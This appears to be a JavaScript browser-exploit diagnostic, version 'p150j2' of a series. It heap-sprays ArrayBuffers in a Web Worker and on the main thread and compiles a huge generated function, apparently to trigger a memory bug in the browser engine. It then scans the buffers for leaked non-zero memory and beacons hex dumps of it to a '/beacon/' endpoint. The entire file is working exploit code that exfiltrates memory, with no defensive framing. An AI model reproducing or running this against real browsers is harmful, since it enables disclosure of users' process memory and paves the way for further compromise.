// p150j2 — Worker spray diagnostic
// p150j got RESULT-0h-0nz but Worker XHR beacons were blocked.
// This version gets ALL diagnostics via postMessage → main thread beacons.
// Key unknowns: did Worker actually spray? how many ABs? timing?
// Also: main thread sprays a small batch DURING compilation for comparison.
// Beacon prefix: V150J2-
(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150J2-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  var workerSrc = '(' + function() {
    var bufs = [];
    var views = [];
    var sprayTimer = null;
    var BUF_SIZE = 100096;
    var startTime = 0;
    var firstAllocTime = 0;
    var lastAllocTime = 0;
    var allocFails = 0;

    onmessage = function(e) {
      if (e.data === 'start') {
        startTime = Date.now();
        sprayTimer = setInterval(function() {
          for (var i = 0; i < 3 && bufs.length < 2000; i++) {
            try {
              var ab = new ArrayBuffer(BUF_SIZE);
              bufs.push(ab);
              views.push(new Uint32Array(ab));
              if (bufs.length === 1) firstAllocTime = Date.now();
              lastAllocTime = Date.now();
            } catch(ex) { allocFails++; break; }
          }
          if (bufs.length >= 2000) {
            clearInterval(sprayTimer);
          }
        }, 15);
      }

      if (e.data === 'scan') {
        var scanStart = Date.now();
        if (sprayTimer) clearInterval(sprayTimer);

        var hitBufs = 0, totalNZ = 0;
        var firstHitBuf = -1, firstHitOff = -1, firstHitVal = 0;
        var sample112 = '';

        for (var i = 0; i < bufs.length; i++) {
          var v = views[i];
          if (!v) continue;
          var nz = 0;
          var localFirst = -1;
          for (var j = 0; j < v.length; j++) {
            if (v[j] !== 0) {
              nz++;
              if (localFirst < 0) localFirst = j;
            }
          }
          if (nz > 0) {
            hitBufs++;
            totalNZ += nz;
            if (firstHitBuf < 0) {
              firstHitBuf = i;
              firstHitOff = localFirst * 4;
              firstHitVal = v[localFirst];
              // dump 28 uint32s (112 bytes) from first NZ position
              var d = [];
              for (var dd = 0; dd < 28 && (localFirst+dd) < v.length; dd++) {
                d.push(v[localFirst+dd].toString(16));
              }
              sample112 = d.join(',');
            }
          }
        }

        var scanEnd = Date.now();

        postMessage({
          type: 'result',
          count: bufs.length,
          hits: hitBufs,
          nz: totalNZ,
          fails: allocFails,
          sprayMs: lastAllocTime - startTime,
          scanMs: scanEnd - scanStart,
          timerFired: startTime > 0 ? 1 : 0,
          firstHitBuf: firstHitBuf,
          firstHitOff: firstHitOff,
          firstHitVal: firstHitVal,
          sample: sample112
        });
      }
    };
  }.toString() + ')();';

  var wBlob = new Blob([workerSrc], {type: 'application/javascript'});
  var wUrl = URL.createObjectURL(wBlob);
  var worker;
  try {
    worker = new Worker(wUrl);
  } catch(e) {
    BS('WORKER-ERR-' + (e.message || '').substring(0,30));
    return;
  }
  BS('WORKER-OK');

  worker.onmessage = function(e) {
    var d = e.data;
    if (d.type === 'result') {
      BS('W-CNT-' + d.count);
      BS('W-HITS-' + d.hits + '-NZ-' + d.nz);
      BS('W-FAILS-' + d.fails);
      BS('W-SPRAY-' + d.sprayMs + 'ms');
      BS('W-SCAN-' + d.scanMs + 'ms');
      BS('W-TIMER-' + d.timerFired);
      if (d.hits > 0) {
        BS('W-1ST-b' + d.firstHitBuf + '-o' + d.firstHitOff + '-' + d.firstHitVal.toString(16));
        BS('W-DUMP-' + d.sample);
      }
    }
  };

  // Start worker spray BEFORE blob creation
  worker.postMessage('start');

  // Main thread also sprays a small batch of ABs for comparison
  // These are allocated on the main thread, same context as compilation
  var mainABs = [];
  var mainViews = [];

  // Build the BIG function
  var N = 38348816;
  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__bigFn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__bigOk=1;';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() {
    BS('SCRIPT-ERR');
    worker.postMessage('scan');
  };
  sc.onload = function() {
    blob = null;
    URL.revokeObjectURL(url);
    BS('COMPILED-' + (window.__bigOk ? 'OK' : 'FAIL'));

    // AFTER compilation: spray ABs on main thread
    // These go to marge bitfit AFTER the metadata buffer
    BS('MAIN-SPRAY-START');
    for (var i = 0; i < 200; i++) {
      try {
        var ab = new ArrayBuffer(100096);
        mainABs.push(ab);
        mainViews.push(new Uint32Array(ab));
      } catch(ex) { break; }
    }
    BS('MAIN-SPRAY-' + mainABs.length);

    // Scan main thread ABs
    var mainHits = 0, mainNZ = 0;
    for (var i = 0; i < mainViews.length; i++) {
      var v = mainViews[i];
      var nz = 0;
      for (var j = 0; j < v.length; j++) {
        if (v[j] !== 0) nz++;
      }
      if (nz > 0) { mainHits++; mainNZ += nz; }
    }
    BS('MAIN-HITS-' + mainHits + '-NZ-' + mainNZ);

    if (mainHits > 0) {
      // Extract first hit details
      for (var i = 0; i < mainViews.length; i++) {
        var v = mainViews[i];
        for (var j = 0; j < v.length; j++) {
          if (v[j] !== 0) {
            BS('MAIN-1ST-b' + i + '-o' + (j*4) + '-' + v[j].toString(16));
            // dump 28 uint32 (112 bytes)
            var d = '';
            for (var dd = 0; dd < 28 && (j+dd) < v.length; dd++) {
              if (dd) d += ',';
              d += v[j+dd].toString(16);
            }
            BS('MAIN-DUMP-' + d);
            break;
          }
        }
        if (mainHits > 0) break;
      }
    }

    // Now tell worker to scan
    worker.postMessage('scan');
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
